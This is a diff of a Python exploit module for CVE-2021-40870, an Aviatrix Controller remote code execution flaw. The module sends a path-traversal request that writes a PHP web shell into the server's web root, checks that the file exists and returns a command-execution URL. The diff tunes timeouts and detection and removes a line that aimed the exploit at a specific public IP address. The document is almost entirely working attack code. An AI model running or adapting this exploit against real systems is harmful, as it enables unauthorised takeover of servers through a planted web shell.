@@ -6,7 +6,6 @@ from urllib.parse import urlparse
 import urllib
 
 
-
 def CVE_2021_40870(base_url):
     relsult = {
         'name': 'CVE-2021-40870 Aviatrix-Controller 远程代码执行',
@@ -32,20 +31,17 @@ def CVE_2021_40870(base_url):
         }
         body = f'CID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/{filename}&data=poc by agun{shell}'
         payload = urllib.parse.urljoin(base_url, '/v1/backend1')
-        r = requests.post(payload, headers=headers, data=body, verify=False, timeout=10)
+        r = requests.post(payload, headers=headers, data=body, verify=False, timeout=5)
 
-        check_file = requests.get(base_url + '/v1/' + filename, verify=False, timeout=10)
-        if check_file.status_code == 200:
+        check_file = requests.get(urllib.parse.urljoin(base_url, '/v1/' + filename), verify=False, timeout=5)
+        check_file2 = requests.get(urllib.parse.urljoin(base_url , '/v1/axekfcerdps'), verify=False, timeout=5)
+        if check_file.status_code == 200 and check_file2.status_code != 200:
             relsult['vulnerable'] = True
             relsult['url'] = base_url
-            relsult['cmdshell'] = base_url + '/v1/' + filename + '?cmd='
+            relsult['cmdshell'] = urllib.parse.urljoin(base_url, '/v1/' + filename + '?cmd=')
             relsult['about'] = 'https://github.com/oxctdev/CVE-2021-40870'
             return relsult
         else:
             return relsult
     except:
         return relsult
-
-
-if __name__ == '__main__':
-    print(CVE_2021_40870('https://54.187.43.193/#/login'))
